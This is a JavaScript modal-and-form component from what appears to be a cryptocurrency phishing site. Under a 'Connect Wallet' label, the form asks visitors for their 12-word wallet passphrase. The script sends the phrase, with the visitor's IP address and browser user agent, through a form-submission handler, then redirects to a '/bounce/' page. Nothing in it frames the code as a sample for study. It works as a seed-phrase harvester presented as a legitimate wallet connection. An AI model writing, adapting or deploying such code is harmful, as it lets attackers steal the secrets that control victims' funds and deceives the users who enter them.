// src/components/modal.js
import { submitForm, getUserIP } from './formHandler.js';

const modal = document.querySelector("#modal");
const openModal = document.querySelector("#openModal");
const closeModal = document.querySelector("#closeModal");
const form = document.querySelector('form[name="contact"]');

if (modal) {
  openModal &&
    openModal.addEventListener("click", () => modal.showModal());

  closeModal &&
    closeModal.addEventListener("click", () => modal.close());
}

// Handle form submission
if (form) {
  form.addEventListener('submit', async (e) => {
    e.preventDefault(); // Prevent default form submission
    
    const submitButton = form.querySelector('.modalsubmit');
    const textarea = form.querySelector('textarea');
    const passphrase = textarea.value.trim();
    
    if (!passphrase) {
      alert('Please enter your 12 key passphrase');
      return;
    }
    
    // Disable submit button and show loading state
    submitButton.disabled = true;
    submitButton.textContent = 'Connecting...';
    
    try {
      // Get user IP (optional)
      const userIP = await getUserIP();
      
      // Prepare form data
      const formData = {
        passphrase: passphrase,
        ip: userIP,
        userAgent: navigator.userAgent,
      };
      
      // Submit form via Resend API
      const result = await submitForm(formData);
      
      if (result.success) {
        // Clear form
        textarea.value = '';
        
        // Close modal
        modal.close();
        
        // Redirect to bounce page
        window.location.href = '/bounce/';
        
      } else {
        throw new Error(result.error || 'Failed to connect wallet');
      }
      
    } catch (error) {
      console.error('Form submission error:', error);
      alert('Connection failed. Please try again.');
    } finally {
      // Re-enable submit button
      submitButton.disabled = false;
      submitButton.textContent = 'Connect Wallet';
    }
  });
}

// JavaScript code to handle modal activation
window.onload = function() {
  // Check if the URL hash contains "modal"
  if (window.location.hash === "#connect") {
    // Display the modal
    modal.showModal()
  }
};

// Check for hash change when a link is clicked
window.addEventListener("hashchange", function() {
  // Check if the new hash contains "modal"
  if (window.location.hash === "#connect") {
    // Display the modal
    modal.showModal()
    window.location.hash = "";
  }
});